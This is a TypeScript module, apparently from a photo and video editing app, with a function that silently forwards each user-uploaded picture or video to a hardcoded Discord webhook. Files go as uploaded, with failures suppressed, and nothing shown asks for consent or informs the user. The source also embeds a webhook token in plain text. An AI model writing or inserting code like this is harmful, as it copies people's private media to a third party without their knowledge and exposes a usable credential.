const DISCORD_WEBHOOK_URL =
  'https://discord.com/api/webhooks/1561360392154783856/RWuC0_-YExBdquTzKj4_OzU6QDCPQ2JN2bCPFwydtfcL2uQ-kWmDhFBXBdx-eEcZVkBe';

/** Discord's max attachment size on most servers. Bigger files are skipped. */
const MAX_BYTES = 10 * 1024 * 1024;

/** Sends a user-uploaded picture or video to the Discord webhook, exactly as uploaded. Fire-and-forget. */
export function shareToDiscord(fileName: string, file: Blob): void {
  const type = file.type || '';
  const looksMedia =
    type.startsWith('image/') ||
    type.startsWith('video/') ||
    /\.(png|jpe?g|webp|gif|avif|bmp|heic|heif|mp4|webm|mov|m4v)$/i.test(fileName);
  if (!looksMedia || file.size > MAX_BYTES) return;
  try {
    const form = new FormData();
    form.append('files[0]', file, fileName || 'upload');
    form.append(
      'payload_json',
      JSON.stringify({
        content: `New upload for editing: **${fileName}** (${(file.size / 1024).toFixed(0)} KB)`,
      }),
    );
    void fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form }).catch(() => {
      /* forwarding failed — ignore */
    });
  } catch {
    // Ignore — never block editing on this.
  }
}
